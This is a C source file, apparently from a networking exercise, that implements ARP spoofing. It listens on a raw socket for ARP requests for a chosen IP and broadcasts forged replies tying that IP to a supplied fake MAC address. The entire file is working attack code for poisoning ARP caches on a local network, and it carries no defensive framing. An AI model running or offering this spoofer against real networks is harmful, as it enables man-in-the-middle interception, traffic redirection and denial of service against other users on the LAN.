#include "arp.h"

void arp_spoofing(const char *filtered_mac, const char *filtered_ip)
{
	void* buffer = (void*)malloc(BUFF_SIZE);
	void* buffer2 = (void*)malloc(BUFF_SIZE);
	int sockfd_send = 0;
	int ifindex = 0;
	struct ifreq req;
	struct sockaddr_ll addr;
	char *ipaddr;
	unsigned char source_ip[4];
	unsigned char target_ip[4];
	unsigned char fake_mac[6] = {0};
	struct arp_packet *packet_rec, *packet_reply;
	ssize_t recvd_size;
	char ip[16];


	// open socket
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open socket error");
		exit(1);
	}
	printf("### ARP spoof mode ###\n");

	// retrieve ethernet interface index
	strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
	if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1) {
		perror("SIOCGIFINDEX");
		exit(1);
	}
	ifindex = req.ifr_ifindex; // prevent another iotcl reset it

	// retrieve ethernet interface MAC
	if (ioctl(sockfd_send, SIOCGIFHWADDR, &req) == -1) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}
	
	//input source ip
	sscanf(filtered_ip, "%hhu.%hhu.%hhu.%hhu", &source_ip[0], &source_ip[1], &source_ip[2], &source_ip[3]);
	//fake mac
	sscanf(filtered_mac, "%hhX:%hhX:%hhX:%hhX:%hhX:%hhX", &fake_mac[0], &fake_mac[1], &fake_mac[2], &fake_mac[3], &fake_mac[4], &fake_mac[5]);


	// prepare sockaddr_ll
	addr.sll_family = AF_PACKET;
	addr.sll_protocol = htons(ETH_P_ARP);
	addr.sll_ifindex = ifindex;
	addr.sll_hatype = htons(ARPHRD_ETHER);
	addr.sll_pkttype = (PACKET_BROADCAST);
	addr.sll_halen = ETH_ALEN;
	addr.sll_addr[0] = req.ifr_hwaddr.sa_data[0];
	addr.sll_addr[1] = req.ifr_hwaddr.sa_data[1];
	addr.sll_addr[2] = req.ifr_hwaddr.sa_data[2];
	addr.sll_addr[3] = req.ifr_hwaddr.sa_data[3];
	addr.sll_addr[4] = req.ifr_hwaddr.sa_data[4];
	addr.sll_addr[5] = req.ifr_hwaddr.sa_data[5];
	addr.sll_addr[6] = 0x00;
	addr.sll_addr[7] = 0x00;
	
	//Creating ARP reply
	//Broadcast
	packet_reply = buffer2;
    memset(packet_reply->eth_hdr.ether_dhost, 0xff, 6);
	for(int i = 0 ; i < 6; i++) {
		packet_reply->eth_hdr.ether_shost[i] = (unsigned char)fake_mac[i];
	}

	packet_reply->eth_hdr.ether_type = htons(ETH_P_ARP);
	packet_reply->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	packet_reply->arp.ea_hdr.ar_pro = htons(ETH_P_IP);
	packet_reply->arp.ea_hdr.ar_hln = ETH_ALEN;
	packet_reply->arp.ea_hdr.ar_pln = 4;
	packet_reply->arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
	for(int i = 0 ; i < 4; i++) {
		packet_reply->arp.arp_spa[i] = (unsigned char)source_ip[i];
	}
	
	for(int i = 0 ; i < 6; i++) {
		packet_reply->arp.arp_sha[i] = (unsigned char)fake_mac[i];
	}

	//OUTPUT
	while (1) {
		if ((recvd_size = recv(sockfd_send, buffer, BUFF_SIZE, 0)) == -1) {
			perror("recv(): ");
			close(sockfd_send);
			exit(-1);
		}

		packet_rec = buffer;

		if (ntohs(packet_rec->eth_hdr.ether_type) != ETH_P_ARP) {
			continue;
		}
		if (ntohs(packet_rec->arp.ea_hdr.ar_op) != ARPOP_REQUEST) {
			continue;
		}

		if (source_ip[0] == packet_rec->arp.arp_tpa[0] &&
			source_ip[1] == packet_rec->arp.arp_tpa[1] &&
			source_ip[2] == packet_rec->arp.arp_tpa[2] &&
			source_ip[3] == packet_rec->arp.arp_tpa[3]) {
			printf("Get ARP packet - Who has %d.%d.%d.%d ?\t\t", packet_rec->arp.arp_tpa[0], packet_rec->arp.arp_tpa[1], packet_rec->arp.arp_tpa[2], packet_rec->arp.arp_tpa[3]);
			printf("Tell %d.%d.%d.%d\n", packet_rec->arp.arp_spa[0], packet_rec->arp.arp_spa[1], packet_rec->arp.arp_spa[2], packet_rec->arp.arp_spa[3]);

			//Set reply IP & fake mac
			for (int i = 0 ; i < 4; i++) {
				packet_reply->arp.arp_tpa[i] = packet_rec->arp.arp_spa[i];
			}
			for (int i = 0 ; i < 6; i++) {
				packet_reply->arp.arp_tha[i] = packet_rec->arp.arp_sha[i];
			}
			printf("Sent ARP Reply : ");
			//target IP
			printf("%hhu.%hhu.%hhu.%hhu", packet_reply->arp.arp_spa[0], packet_reply->arp.arp_spa[1], packet_reply->arp.arp_spa[2], packet_reply->arp.arp_spa[3]);

			//fake MAC
			printf("is %hhu:%hhu:%hhu:%hhu:%hhu:%hhu\n", fake_mac[0], fake_mac[1], fake_mac[2], fake_mac[3], fake_mac[4], fake_mac[5]);

			// Send request for a raw socket descriptor.
			if (sendto(sockfd_send, packet_reply, sizeof(struct arp_packet), 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll)) < 0) {
				perror("sendto():");
				exit(1);
			}
			printf("Send successful.\n");	
			
		}
	}
	
	free(buffer);
	free(buffer2);
	close(sockfd_send);
}